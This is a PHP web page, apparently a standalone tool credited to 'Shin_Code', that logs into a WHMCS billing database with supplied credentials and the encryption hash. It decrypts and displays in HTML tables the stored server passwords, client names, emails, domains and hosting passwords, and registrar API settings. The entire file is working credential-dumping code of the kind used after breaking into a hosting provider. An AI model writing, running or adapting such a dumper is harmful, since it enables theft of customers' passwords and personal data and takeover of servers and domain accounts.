<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Database Connection Info</title>
    <style>
        table {
            width: 80%;
            border-collapse: collapse;
            margin: 20px auto;
        }
        table, th, td {
            border: 1px solid black;
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        td {
            word-wrap: break-word;
        }
        h2 {
            text-align: center;
        }
        form {
            width: 50%;
            margin: 20px auto;
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        footer {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $db_host = $_POST['db_host'];
    $db_username = $_POST['db_username'];
    $db_password = $_POST['db_password'];
    $db_name = $_POST['db_name'];
    $cc_encryption_hash = $_POST['cc_encryption_hash'];

    function decrypt($string, $cc_encryption_hash) {
        $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
        $hash_key = _hash($key);
        $hash_length = strlen($hash_key);
        $string = base64_decode($string);
        $tmp_iv = substr($string, 0, $hash_length);
        $string = substr($string, $hash_length, strlen($string) - $hash_length);
        $iv = $out = '';
        $c = 0;
        while ($c < $hash_length) {
            $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
            ++$c;
        }
        $key = $iv;
        $c = 0;
        while ($c < strlen($string)) {
            if ($c != 0 && $c % $hash_length == 0) {
                $key = _hash($key . substr($out, $c - $hash_length, $hash_length));
            }
            $out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
            ++$c;
        }
        return $out;
    }

    function _hash($string) {
        if (function_exists('sha1')) {
            $hash = sha1($string);
        } else {
            $hash = md5($string);
        }
        $out = '';
        $c = 0;
        while ($c < strlen($hash)) {
            $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
            $c += 2;
        }
        return $out;
    }

    $link = new mysqli($db_host, $db_username, $db_password, $db_name);

    if ($link->connect_error) {
        die("Connection failed: " . $link->connect_error);
    }

    echo "<h2>Server Information</h2>";
    echo "<table>
            <tr><th>Type</th><th>Active</th><th>Hostname</th><th>IP Address</th><th>Username</th><th>Password</th></tr>";
    $query = $link->query("SELECT * FROM tblservers");
    while ($v = $query->fetch_assoc()) {
        $ipaddress = $v['ipaddress'];
        $username = $v['username'];
        $type = $v['type'];
        $active = $v['active'];
        $hostname = $v['hostname'];
        $password = decrypt($v['password'], $cc_encryption_hash);

        echo "<tr>
                <td>$type</td>
                <td>$active</td>
                <td>$hostname</td>
                <td>$ipaddress</td>
                <td>$username</td>
                <td>$password</td>
              </tr>";
    }
    echo "</table>";

    echo "<h2>Client and Hosting Info</h2>";
    echo "<table>
            <tr><th>First Name</th><th>Last Name</th><th>Email</th><th>Domain</th><th>Username</th><th>Password</th></tr>";
    $query = $link->query("SELECT tblclients.firstname, tblclients.lastname, tblclients.email, tblhosting.domain, tblhosting.username, tblhosting.password 
                           FROM tblclients 
                           JOIN tblhosting ON tblclients.id = tblhosting.userid");
    while ($v = $query->fetch_assoc()) {
        $firstname = $v['firstname'];
        $lastname = $v['lastname'];
        $email = $v['email'];
        $domain = $v['domain'];
        $username = $v['username'];
        $password = decrypt($v['password'], $cc_encryption_hash);

        echo "<tr>
                <td>$firstname</td>
                <td>$lastname</td>
                <td>$email</td>
                <td>$domain</td>
                <td>$username</td>
                <td>$password</td>
              </tr>";
    }
    echo "</table>";

    echo "<h2>Domain Reseller</h2>";
    echo "<table>
            <tr><th>Registrar</th><th>Setting</th><th>Value</th></tr>";
    $query = $link->query("SELECT * FROM tblregistrars");
    while ($v = $query->fetch_assoc()) {
        $registrar = $v['registrar'];
        $setting = $v['setting'];
        $value = decrypt($v['value'], $cc_encryption_hash);
        if ($value == "") {
            $value = 0;
        }
        echo "<tr>
                <td>$registrar</td>
                <td>$setting</td>
                <td>$value</td>
              </tr>";
    }
    echo "</table>";

    $link->close();
} else {
    echo '
    <h2>Simple Whmcs Db Login</h2>
    <form action="" method="post">
        <label for="db_host">DB Host:</label>
        <input type="text" id="db_host" name="db_host" required><br>

        <label for="db_username">DB user:</label>
        <input type="text" id="db_username" name="db_username" required><br>

        <label for="db_password">DB Pass:</label>
        <input type="password" id="db_password" name="db_password" required><br>

        <label for="db_name">Db Name:</label>
        <input type="text" id="db_name" name="db_name" required><br>

        <label for="cc_encryption_hash">CC Hash:</label>
        <input type="text" id="cc_encryption_hash" name="cc_encryption_hash" required><br>

        <input type="submit" value="Submit">
    </form>';
}
?>
<footer>
    &copy; <?php echo date("Y"); ?> Shin_Code. All Rights Reserved.
</footer>
</body>
</html>
